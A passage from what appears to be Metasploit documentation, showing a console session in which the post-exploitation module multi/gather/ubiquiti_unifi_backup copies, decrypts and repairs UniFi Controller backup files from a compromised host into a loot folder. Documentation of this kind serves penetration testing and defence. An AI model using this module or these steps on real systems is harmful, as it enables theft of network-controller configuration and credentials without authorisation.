session.\nmsf5 post(multi/gather/ubiquiti_unifi_backup) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nls -lah /var/lib/unifi/backup/*.unf\n-rw-r----- 1 unifi unifi  15K Mar 22 21:15 /var/lib/unifi/backup/5.10.19.unf\n-rw-r----- 1 unifi unifi 3.3M May 10 13:59 /var/lib/unifi/backup/5.10.20.unf\n-rw-r----- 1 unifi unifi 3.3M May 10 14:26 /var/lib/unifi/backup/5.10.23.unf\n^Z\nBackground session 1? [y/N]  y\nmsf5 post(multi/gather/ubiquiti_unifi_backup) &gt; set session 1\nsession =&gt; 1\nmsf5 post(multi/gather/ubiquiti_unifi_backup) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[+] Read UniFi Controller file /var/lib/unifi/system.properties\n[+] File /var/lib/unifi/backup/5.10.19.unf saved to /root/.msf4/loot/20190510150128_default_1.1.1.1_ubiquiti.unifi.b_313804.unf\n[+] File 5.10.19.unf DECRYPTED and saved to /root/.msf4/loot/20190510150128_default_1.1.1.1_ubiquiti.unifi.b_129165.zip.  File needs to be repair via `zip -FF`\n[*] Attempting to repair zip file (this is normal)\n[+] File /var/lib/unifi/backup/5.10.19.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190510150128_default_1.1.1.1_ubiquiti.unifi.b_016198.zip.\n[-] /var/lib/unifi/backup/5.10.20.unf read at 0 bytes.  Either file is empty or error reading.  If this is a shell, you need to upgrade to meterpreter!!!\n[-] /var/lib/unifi/backup/5.10.23.unf read at 0 bytes.  Either file is empty or error reading.  If this is a shell, you need to upgrade to meterpreter!!!\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e67100f6-a92c-501c-ad85-3ca4162ffd35"}}}